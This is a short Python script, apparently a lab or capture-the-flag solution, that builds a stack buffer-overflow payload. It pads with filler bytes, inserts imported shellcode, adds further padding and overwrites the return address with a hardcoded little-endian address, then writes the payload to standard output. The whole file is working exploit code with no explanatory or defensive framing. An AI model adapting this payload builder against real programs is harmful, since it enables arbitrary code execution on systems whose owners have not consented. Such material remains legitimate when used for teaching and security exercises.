import sys
from shellcode import shellcode
if __name__ == "__main__":
    attack = b"a" * (1024 - len(shellcode))
    attack += shellcode

    attack += b"a" * 12
    attack += 0xFFF690cd.to_bytes(4, "little")

    sys.stdout.buffer.write(attack)
